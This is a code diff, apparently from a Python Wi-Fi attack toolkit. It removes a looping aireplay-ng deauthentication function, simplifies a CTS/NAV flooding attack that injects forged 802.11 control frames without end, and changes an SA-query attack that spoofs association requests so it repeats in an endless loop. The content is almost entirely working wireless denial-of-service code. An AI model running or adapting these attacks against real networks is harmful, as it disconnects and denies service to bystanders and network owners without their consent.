@@ -14,15 +14,10 @@ def forged_1(interface, sta, ap):
     pass
 
 
-def simple_deauth(interface, ap, sta=None):
-    while True:
-        subprocess.run(['aireplay-ng', '-0', '100', '-a', ap.bssid, '-c' if sta else '', sta.mac_addr if sta else ''])
-
-
 def cts_nav_attack(interface, target_mac):
     # http://matej.sustr.sk/publ/articles/cts-dos/cts-dos.en.html
-    pkt = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna',
-                   notdecoded='\x00\x6c' + interface.get_frequency() + '\xc0\x00\xc0\x01\x00\x00') / \
+    # pkt = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna',
+    pkt = RadioTap() / \
           Dot11(ID=0x7d00, type='Control', subtype=12, addr1=target_mac)
     while True:
         interface.inject(pkt)
@@ -30,5 +25,6 @@ def cts_nav_attack(interface, target_mac):
 
 def sa_query_attack(interface, ap, sta):
     pkt = Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
-        Dot11AssoReq(cap=0x1100, listen_interval=0x000a)
-    interface.inject(pkt)
+          Dot11AssoReq(cap=0x1100, listen_interval=0x000a)
+    while True:
+        interface.inject(pkt)
